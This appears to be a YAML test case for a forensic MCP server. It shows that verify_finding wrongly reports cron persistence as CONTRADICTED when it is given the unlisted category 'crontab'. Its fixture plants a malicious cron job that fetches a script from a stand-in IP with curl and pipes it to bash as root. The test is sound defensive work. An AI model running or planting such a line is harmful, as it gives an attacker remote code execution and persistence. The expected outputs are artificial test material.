# Matrix case P2061-001: verify_finding's persistence_mechanism_exists does
# not check params.category against the documented list (cron, systemd, ...).
# An unknown value such as "crontab" just finds no high-severity findings of
# that exact string and returns CONTRADICTED, as if the evidence showed there
# is no such persistence.
case_id: P2061-001
problem: P2061
server: findevil
variant: findevil-d1a8d25
commit: d1a8d25d9c8c05bd66881506cb1f12314ee7c5e1
display: response
level: mcp
realism: possible
realism_ko: "`cron` 대신 `crontab`처럼 허용 목록 밖의 비슷한 값을 쓰는 모델 실수는 실제로 생긴다."
coverage: full
summary: With a malicious cron job in the evidence, verify_finding(persistence_mechanism_exists, category "crontab") is not rejected as an unknown category but returns CONTRADICTED, "no high-severity crontab persistence", while category "cron" on the same root returns SUPPORTED.
summary_ko: "증거에 악성 cron 작업이 있을 때, verify_finding(persistence_mechanism_exists, category \"crontab\")은 모르는 범주로 거부되지 않고 CONTRADICTED \"no high-severity crontab persistence\"를 돌려준다. 같은 루트에서 category \"cron\"은 SUPPORTED를 돌려준다."
defect_ko: "정상이라면 허용 목록 밖의 범주는 오류로 알려야 하는데, 이 서버는 그 문자열로 찾고 없으면 CONTRADICTED를 낸다. 그래서 모델은 실제로 있는 악성 cron 지속성을 없다고 잘못 안다."
setup_ko: "`/etc/cron.d/`에 외부 스크립트를 내려받아 실행하는 악성 cron 작업을 두었다."
fixture:
  - path: fs/etc/cron.d/sysupdate
    text: "* * * * * root curl -s http://203.0.113.7/x.sh | bash\n"
steps:
  - tool: verify_finding
    note_ko: "결함이 있는 호출: 범주를 `crontab`으로 준 지속성 검증"
    args:
      claim_type: persistence_mechanism_exists
      params: "{\"fs_root\": \"${EVIDENCE}/fs\", \"category\": \"crontab\"}"
  - tool: verify_finding
    note_ko: "비교용: 허용 값 `cron`으로 같은 검증"
    args:
      claim_type: persistence_mechanism_exists
      params: "{\"fs_root\": \"${EVIDENCE}/fs\", \"category\": \"cron\"}"
expect:
  - step: 1
    note_ko: "주장이 CONTRADICTED로 판정된다"
    contains: "**Verdict:** CONTRADICTED"
  - step: 1
    note_ko: "그런 지속성이 없다는 근거가 붙는다"
    contains: "no high-severity crontab persistence"
  - step: 1
    note_ko: "모르는 범주라는 경고가 없다"
    not_regex: "(?i)unknown category|invalid category|must be one of"
  - step: 2
    note_ko: "허용 값으로 주면 SUPPORTED가 나온다"
    contains: "**Verdict:** SUPPORTED"
